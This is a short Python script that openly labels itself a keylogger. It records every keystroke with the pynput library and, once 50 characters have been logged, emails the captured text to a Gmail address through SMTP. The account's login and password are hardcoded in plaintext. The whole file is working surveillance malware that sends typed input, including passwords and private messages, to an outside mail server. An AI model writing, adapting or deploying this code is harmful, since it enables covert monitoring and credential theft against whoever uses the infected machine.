#!/usr/bin/env python
import smtplib
import getpass
from email.mime.text import MIMEText
from datetime import date
from pynput.keyboard import Key, Listener



SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
SMTP_USERNAME = "zuberbuhlertesting@gmail.com"
SMTP_PASSWORD = "TestingTheLimits1!"

EMAIL_TO = ["zuberbuhlertesting@gmail.com"]
EMAIL_FROM = "zuberbuhlertesting@gmail.com"
EMAIL_SUBJECT = "Demo Email : "

DATE_FORMAT = "%d/%m/%Y"
EMAIL_SPACE = ", "

DATA='This is the content of the email.'

def send_email():
    msg = MIMEText(DATA)
    msg['Subject'] = EMAIL_SUBJECT + " %s" % (date.today().strftime(DATE_FORMAT))
    msg['To'] = EMAIL_SPACE.join(EMAIL_TO)
    msg['From'] = EMAIL_FROM
    mail = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
    mail.starttls()
    mail.login(SMTP_USERNAME, SMTP_PASSWORD)
    mail.sendmail(EMAIL_FROM, EMAIL_TO, msg.as_string())
    mail.quit()


print("KeyLogger")

#set up email
# email = input("Enter email: ")
# password = getpass.getpass(prompt='Password: ', stream = None)

# server = smtplib.SMTP_SSL('smtp.gmail.com', 587)
# server.login("zuberbuhlertesting@gmail.com", "TestingTheLimits1!")

print("Logged in, sending email:")
#This should send an email :D

DATA='Starting Keylogger'

send_email()

print("Sent email")


#logger
full_log = ''
word = ''
email_char_limit = 50

def on_press(key):
	global word
	global full_log
	global email_char_limit

	global SMTP_SERVER
	global SMTP_PORT
	global SMTP_USERNAME
	global SMTP_PASSWORD

	global EMAIL_TO
	global EMAIL_FROM
	global EMAIL_SUBJECT

	global DATE_FORMAT
	global EMAIL_SPACE

	global DATA

	if key == Key.space or key == Key.enter:
		word += ' '
		full_log += word
		word = ''
		if len(full_log) >= email_char_limit:
			DATA=full_log
			send_email()
			print("Sending Log")
			full_log = ''
	elif key == Key.shift_l or key== Key.shift_r:
		return
	elif key == Key.backspace:
		word = word[:-1]
	else:
		char = f'{key}'
		char = char[1:-1]
		word += char

	if key == Key.esc:
		return False


with Listener (on_press = on_press) as listener:
	listener.join()

# Testing the keylogger!
